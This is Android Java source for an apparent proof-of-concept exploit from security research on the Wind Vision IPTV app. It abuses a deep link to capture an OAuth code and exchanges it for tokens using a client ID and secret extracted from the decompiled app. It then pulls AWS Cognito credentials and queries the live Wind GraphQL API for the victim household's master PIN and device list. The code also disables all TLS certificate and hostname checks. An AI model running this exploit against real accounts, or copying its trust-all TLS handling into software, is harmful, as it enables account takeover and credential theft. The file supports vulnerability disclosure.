package com.fsecure.deeplinkabuser;

import android.content.Context;
import android.media.MediaDrm;
import android.media.UnsupportedSchemeException;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.nio.charset.StandardCharsets;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.UUID;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.FormBody;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class TakeoverTask extends AsyncTask<Uri, Void, Void> {
    // both these extracted from  decompiled Wind Vision APK.
    public static final String CLIENT_ID = "52424f79824c1a27ce697036c1c1000a49c67d7a2219a05e";
    public static final String CLIENT_SECRET = "553914b93d004f019729fbe6f1abe3648f2f9afad19f000a49c67d7a2219a05e";

    private Context context;
    private OkHttpClient client;

    private String deviceId;

    public TakeoverTask(Context ctx){
        this.context = ctx;

        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        builder = ignoreCerts(builder);
        this.client = builder.build();
    }

    @Override
    protected Void doInBackground(Uri... uris) {
        try{
            String code = uris[0].getQueryParameter("code");
            String token = codeForToken(code);
            String credential = tokenForCredential(token);
            String deviceId = calculateDeviceId();
            HackedInfo hackedInfo = performPocQraphQLReq(credential, deviceId);
            NotificationUtils.createHackNotification(context, hackedInfo);
        } catch(Exception e){
            Log.e("DLA", "doInBackground failed, will call real app... ", e);
            MainActivity.callRealApp(context);
        }
        return null;
    }



    private OkHttpClient.Builder ignoreCerts(OkHttpClient.Builder builder) {
        try {
            final TrustManager[] trustAllCerts = new TrustManager[] {
                    new X509TrustManager() {
                        @Override
                        public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType)
                                throws CertificateException {}

                        @Override
                        public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType)
                                throws CertificateException {}

                        @Override
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return new java.security.cert.X509Certificate[]{};
                        }
                    }
            };

            final SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());
            final SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
            builder.sslSocketFactory(sslSocketFactory, (X509TrustManager)trustAllCerts[0]);
            builder.hostnameVerifier(new HostnameVerifier() {
                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });
        } catch(Exception e){
            Log.e("DLA", "ignoring certs failed, will call real app... ", e);
            MainActivity.callRealApp(context);
        }
        return builder;
    }


    /**
     * Reach WIND IdP server to exchange intercepted code with an id_token
     * Performs the following request
     *
     * @<code>
     * POST /oauth2/v1/token HTTP/1.1
     * Zappware-User-Agent: android_phone/v10.0.15(148) (Nexx 4.0 Android Phone; Android Oreo; 8.1.0) Xiaomi (Redmi_5_Plus)
     * User-Agent: android_phone
     * Content-Type: application/x-www-form-urlencoded
     * Host: pridp.wind.gr
     *
     * code=05d21e7da...5c928ca&
     * grant_type=authorization_code&
     * redirect_uri=nexx4%3A%2F%2Fpridp.wind.gr%2FAuthCallback&
     * scope=openid%20offline_access%20profile%20IPTVUserID&
     * client_id=52424f79824c1a27ce697036c1c1000a49c67d7a2219a05e&
     * client_secret=553914b93d004f019729fbe6f1abe3648f2f9afad19f000a49c67d7a2219a05e
     * </code>
     *
     * Receives response:
     * @<code>
     * HTTP/1.1 200 OK
     * Content-Length: 2237
     * Content-Type: application/json; charset=UTF-8
     * Cache-Control: no-store
     * Pragma: no-cache
     * Connection: Close
     * Set-Cookie: TS014ac1d7=010197b77c5...437e8d56c642; Path=/
     * Access-Control-Allow-Origin: https://www.wind.gr
     *
     * {
     *   "access_token":"ewogICJhbGciOiJSUzI1NiIsCiAgI...Txif10aAMlQwMpjL34ejvA05A",
     *   "expires_in":300,
     *   "token_type":"Bearer",
     *   "scope":"openid",
     *   "id_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6I...inqOIkOvtjAg_9ke3ECXkL7kqnfZuQ"
     * }
     * </code>
     *
     * @param code
     * @return
     */
    private String codeForToken(String code) throws Exception {
        RequestBody requestBody = new FormBody.Builder()
                .add("code", code)
                .add("grant_type", "authorization_code")
                .add("redirect_uri", "nexx4://pridp.wind.gr/AuthCallback")
                .add("scope","openid offline_access profile IPTVUserID")
                .add("client_id", CLIENT_ID)
                .add("client_secret", CLIENT_SECRET)
                .build();

        Request request = new Request.Builder()
                .url("https://pridp.wind.gr/oauth2/v1/token")
                .header("User-Agent", "android_phone")
                .header("Zappware-User-Agent", "android_phone/v10.0.15(148) (Nexx 4.0 Android Phone; Android Oreo; 8.1.0) Xiaomi (Redmi_5_Plus)")
                .post(requestBody)
                .build();

        Response response = this.client.newCall(request).execute();
        if (response.code()!=200) throw new Exception();                                            // stop everything on first error
        JSONObject jsonObject = new JSONObject(response.body().string());
        return jsonObject.getString("id_token");
    }


    /**
     * Reach AWS to exchange the JWT id_token for Credential
     * Performs the following request:
     *
     * @<code>
     * POST / HTTP/1.1
     * aws-sdk-invocation-id: 23f19117-b25...
     * User-Agent: aws-sdk-android/2.12.1 Linux/3.18.71-perf-g2211f76 Dalvik/2.1.0/0 en_GB
     * aws-sdk-retry: 0/0
     * Accept-Encoding: gzip, deflate
     * X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity
     * Content-Type: application/x-amz-json-1.1
     * Content-Length: 958
     * Host: cognito-identity.eu-west-1.amazonaws.com
     * Connection: close
     *
     * {
     *     "IdentityId": "eu-west-1:1a18ca6b-0c60-404a-b196-9667b460fc17",
     *     "Logins": {
     *         "pridp.wind.gr": "eyJhbGciOiJSUzI1NiIsImtpZCI6I...F6MbSfWcfyIqWQrEsAinqOIkOvtjAg_9ke3ECXkL7kqnfZuQ"
     *     }
     * }
     * </code>
     *
     * Receives response:
     * @<code>
     * HTTP/1.1 200 OK
     * Date: Sun, 13 Sep 2020 20:44:06 GMT
     * Content-Type: application/x-amz-json-1.1
     * Content-Length: 1452
     * Connection: close
     * x-amzn-RequestId: 2496f88...
     *
     * {
     *     "Credentials": {
     *         "AccessKeyId": "ASIAUN3BNO3KZC52I2M3",
     *         "Expiration": 1600033446,
     *         "SecretKey": "ezA/W7+In...b8j0QU1UH0Dp",
     *         "SessionToken": "IQoJb3JpZ2l...xN"
     *     },
     *     "IdentityId": "eu-west-1:1a18ca6b-0c60-404a-b196-9667b460fc17"
     * }
     * </code>
     * @param token
     * @return
     */
    private String tokenForCredential(String token) throws Exception {
        MediaType JSON = MediaType.parse("application/x-amz-json-1.1; charset=utf-8");
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("IdentityId","eu-west-1:1a18ca6b-0c60-404a-b196-9667b460fc17");  // this might be different and might need another req before...
        jsonObject.put("Logins",
                new JSONObject().put("pridp.wind.gr",token)
        );
        RequestBody requestBody = RequestBody.create(JSON,jsonObject.toString().getBytes(StandardCharsets.UTF_8));


        Request request = new Request.Builder()
                .url("https://cognito-identity.eu-west-1.amazonaws.com/")
                .header("User-Agent", "aws-sdk-android/2.12.1 Linux/3.18.71-perf-g2211f76 Dalvik/2.1.0/0 en_GB")
                .header("X-Amz-Target","AWSCognitoIdentityService.GetCredentialsForIdentity")
//                .header("aws-sdk-invocation-id", "babf9b55-c8ce-48ba-81b1-f90f9b14635a")
                .header("aws-sdk-retry","0/0")
                .header("Content-Type", "application/x-amz-json-1.1")
                .post(requestBody)
                .build();

        Response response = client.newCall(request).execute();
        if (response.code()!=200) throw new Exception();                                            // stop everything on first error
        JSONObject respObject = new JSONObject(response.body().string());
        return respObject.getJSONObject("Credentials").getString("AccessKeyId");
    }

    private String calculateDeviceId() {
        UUID UUID = new UUID(-1301668207276963122L, -6645017420763422227L);     // these are probably OR'ed flags, will just use them as seen in the decompiled code
        byte[] deviceUniqueID = new byte[0];
        try {
            deviceUniqueID = new MediaDrm(UUID).getPropertyByteArray(MediaDrm.PROPERTY_DEVICE_UNIQUE_ID);
            String id = Base64.encodeToString(deviceUniqueID, 2)
                    .replaceAll("=", "99")
                    .replaceAll("/", "88")
                    .replaceAll("\\+", "77");
            if (id.length() >= 100) {
                id = id.substring(0, 99);
            }
            Log.d("DLA", "ID calculated is: "+id);
            return id;
        } catch (UnsupportedSchemeException e) {
            Log.e("DLA", "calculateDeviceId failed, exiting to real app... ", e);
            return null;
        }
    }


    /**
     * Reach GraphQL server to make a PoC API call
     * Request performed:
     *
     * @<code>
     * POST /secure/v1/graphql/ HTTP/1.1
     * Accept: application/json
     * User-Agent: android_phone
     * Authorization: AWS4-HMAC-SHA256 Credential=ASIAUN3BNO...
     * Host: client.tvclient.wind.gr
     * Device-Id: R2pNREh7R2FWdE1...
     * Content-Type: application/json; charset=utf-8
     * Content-Length: 3000
     * Connection: close
     * Accept-Encoding: gzip, deflate
     *
     * {
     *     "query": "query User {  me {    __typen...
     *     "operationName": "User",
     *     "variables": {}
     * }
     * </code>
     * @param credential
     * @return
     * @throws Exception
     */
    private HackedInfo performPocQraphQLReq(String credential, String deviceId) throws Exception {
        MediaType JSON = MediaType.parse("application/json; charset=utf-8");
        String graphQLbody = "{\"query\":\"query User {  me {    __typename    id    firstName    guestMode    household {      __typename      ...householdFragment    }    device {      __typename      ...myDeviceFragment      quickGuideVideo {        __typename        id        title        entitlements {          __typename          ...vodAssetDetailsEntitlementsFragment        }      }    }  }}fragment catalogInfo on Catalog {  __typename  itemCount}fragment vodAssetDetailsEntitlementsFragment on VODAssetEntitlementCatalog {  __typename  id  items {    __typename    ...vodAssetEntitlementFragment    product {      __typename      ...vodDetailProductFragment    }  }}fragment vodAssetEntitlementFragment on VODAssetEntitlement {  __typename  id  playbackAvailableUntil  playback}fragment parentalRatingInfo on ParentalRating {  __typename  id  title  rank  adult}fragment householdFragment on Household {  __typename  id  profiles {    __typename    id    ...catalogInfo    items {      __typename      ...profileFragment    }  }  community {    __typename    ...communityInfo  }  devices {    __typename    ...deviceCatalogFragment  }  onboardingInfo {    __typename    ...householdOnboardingInfoFragment  }  masterPincode  trackViewingBehaviour  agreedToTermsAndConditions  maxNumberOfConfirmedReplayChannels  previewModeAllowed  canMoveOperatorChannelLists}fragment deviceCatalogFragment on DeviceCatalog {  __typename  id  ...catalogInfo  items {    __typename    ...deviceFragment  }}fragment profileFragment on Profile {  __typename  id  name  kind  pincode  permissions {    __typename    parentalRating {      __typename      ...parentalRatingInfo    }    maskContent    displayBlockedChannels  }  onboardingInfo {    __typename    id    ageRatingStepCompleted  }  preferences {    __typename    id    firstAudioLanguage    secondAudioLanguage    firstSubtitleLanguage    secondSubtitleLanguage  }}fragment deviceFragment on Device {  __typename  id  language {    __typename    ...languageInfo  }  name  renameable  registrationTime  removable  removableFrom  deviceType  previewModeEnabled  deviceEnablementPolicies {    __typename    ...deviceEnablementPolicyFragment  }}fragment myDeviceFragment on Device {  __typename  ...deviceFragment  fingerprintId  eventLoggingOptions}fragment communityInfo on Community {  __typename  id  title  description}fragment languageInfo on Language {  __typename  id  title  code}fragment vodDetailProductFragment on VODProduct {  __typename  id  kind  videoQuality  entitlement {    __typename    ...vodProductEntitlementFragment  }}fragment vodProductEntitlementFragment on ProductEntitlement {  __typename  id  availableUntil}fragment deviceEnablementPolicyFragment on DeviceEnablementPolicy {  __typename  id  title  shortTitle  enabled  enabledUntil}fragment householdOnboardingInfoFragment on HouseholdOnboardingInfo {  __typename  id  masterPincodeStepCompleted  communityStepCompleted  privacyStepCompleted  replayStepCompleted}\",\"operationName\":\"User\",\"variables\":{}}";
        RequestBody requestBpdy = RequestBody.create(JSON, graphQLbody);
        Request request = new Request.Builder()
                .url("https://client.tvclient.wind.gr/secure/v1/graphql/")
                .header("Authorization", "AWS4-HMAC-SHA256 Credential="+credential)
                .header("Device-Id",deviceId)
                .post(requestBpdy)
                .build();

        Response response = this.client.newCall(request).execute();
        if (response.code()!=200) throw new Exception(); // stop everything on first error
        JSONObject respObject = new JSONObject(response.body().string());

        // data.me.household.masterpincode (CVE-2021-22269)
        // data.me.household.devices.items[*].name
        HackedInfo ret = new HackedInfo();
        ret.setPinCode(respObject.getJSONObject("data").getJSONObject("me").getJSONObject("household").getString("masterPincode"));
        JSONArray deviceArray = respObject.getJSONObject("data").getJSONObject("me").getJSONObject("household").getJSONObject("devices").getJSONArray("items");
        int size = deviceArray.length();
        ArrayList<String> as = new ArrayList<>(size);
        for(int i=0; i<size; i++){
            as.add(deviceArray.getJSONObject(i).getString("name") );
        }
        ret.setDevices(as);
        return ret;
    }

}
